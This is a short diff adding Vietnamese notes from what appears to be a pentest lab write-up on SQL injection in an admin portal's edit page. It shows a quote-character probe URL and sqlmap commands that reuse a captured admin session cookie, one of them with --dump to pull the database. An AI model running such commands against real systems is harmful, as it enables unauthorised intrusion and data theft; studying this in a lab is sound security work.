@@ -1,0 +1,14 @@
+Tìm kiếm google danh sách payload dùng để fuzzing, tìm kiếm lỗ hổng SQL Injection:
+"pentest lab sql injection cheat sheet"
+
+Một lỗ hổng khác nằm ở chức năng edit của admin, sử dụng cookie admin và quay lại trang admin portal:
+
+URI để khai thác SQL injection trên trang admin portal là:
+
+http://192.168.27.164/admin/edit.php?id='
+
+Sử dụng công cụ sqlmap để khai thác SQLi với câu lệnh sau:
+
+sqlmap -u "http://192.168.27.164/admin/edit.php?id=1" --cookie=PHPSESSID=<cookie_admin>
+|
+sqlmap -u "http://192.168.27.164/admin/edit.php?id=1" --cookie=PHPSESSID=<cookie_admin> --dump
